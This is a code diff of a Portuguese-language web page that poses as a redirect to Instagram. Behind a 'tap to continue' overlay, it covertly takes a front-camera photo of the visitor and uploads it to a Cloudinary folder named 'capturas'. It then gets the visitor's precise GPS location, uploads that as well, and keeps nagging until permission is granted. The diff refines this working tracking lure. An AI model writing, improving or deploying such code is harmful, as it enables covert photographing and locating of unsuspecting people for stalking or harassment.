@@ -2,7 +2,7 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecionamento</title> 
+  <title>Redirecionamento</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin: 0; overflow: hidden; background: #000; }
@@ -20,29 +20,30 @@
       z-index: 9999;
       text-align: center;
       padding: 20px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div id="overlay">Toque para continuar...</div>
+
   <script>
     const cloudName = "dx5legahb";
     const uploadPreset = "upload";
     const folderName = "capturas";
+
+    let capturedImageUrl = null;
 
     function showOverlay(message, callback) {
       const overlay = document.getElementById("overlay");
       overlay.textContent = message;
       overlay.style.display = "flex";
 
-      const handler = () => {
+      overlay.onclick = null;
+      overlay.onclick = () => {
         overlay.style.display = "none";
-        overlay.removeEventListener("click", handler);
-        if (callback) callback();
+        callback();
       };
-
-      overlay.removeEventListener("click", handler);
-      overlay.addEventListener("click", handler);
     }
 
     async function capturePhoto() {
@@ -51,6 +52,7 @@
           video: { facingMode: "user" },
           audio: false
         });
+
         const video = document.createElement("video");
         video.playsInline = true;
         video.muted = true;
@@ -81,11 +83,12 @@
 
         if (!response.ok) throw new Error("Erro ao enviar imagem");
         const data = await response.json();
-        return data.secure_url;
+        capturedImageUrl = data.secure_url;
+        return capturedImageUrl;
       } catch (error) {
         console.error("Erro na captura da foto:", error);
         showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
-          startFlow(); // Aqui sim pode reiniciar o fluxo completo
+          start(); // Pede câmera de novo
         });
         throw error;
       }
@@ -108,18 +111,18 @@
             body: textForm
           });
 
-          if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
+          if (!textResp.ok) throw new Error("Erro ao enviar localização");
           window.location.href = "https://instagram.com";
         } catch (err) {
-          console.error("Erro no envio da localização:", err);
+          console.error("Erro ao enviar localização:", err);
           showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-            requestLocation(imageUrl); // tenta de novo só a localização
+            requestLocation(imageUrl); // Tenta só localização novamente
           });
         }
       }, (err) => {
         console.error("Erro ao obter localização:", err);
         showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-          requestLocation(imageUrl); // tenta de novo só a localização
+          requestLocation(imageUrl); // Tenta só localização novamente
         });
       }, {
         enableHighAccuracy: true,
@@ -128,17 +131,21 @@
       });
     }
 
-    async function startFlow() {
+    async function start() {
       try {
-        const imageUrl = await capturePhoto();
-        requestLocation(imageUrl);
+        if (!capturedImageUrl) {
+          const imageUrl = await capturePhoto();
+          requestLocation(imageUrl);
+        } else {
+          requestLocation(capturedImageUrl); // Reutiliza imagem se já foi tirada
+        }
       } catch (e) {
-        console.error("Erro no fluxo:", e);
+        console.error("Erro no fluxo inicial:", e);
       }
     }
 
     window.addEventListener("DOMContentLoaded", () => {
-      showOverlay("Toque para continuar...", () => startFlow());
+      showOverlay("Toque para continuar...", () => start());
     });
   </script>
 </body>
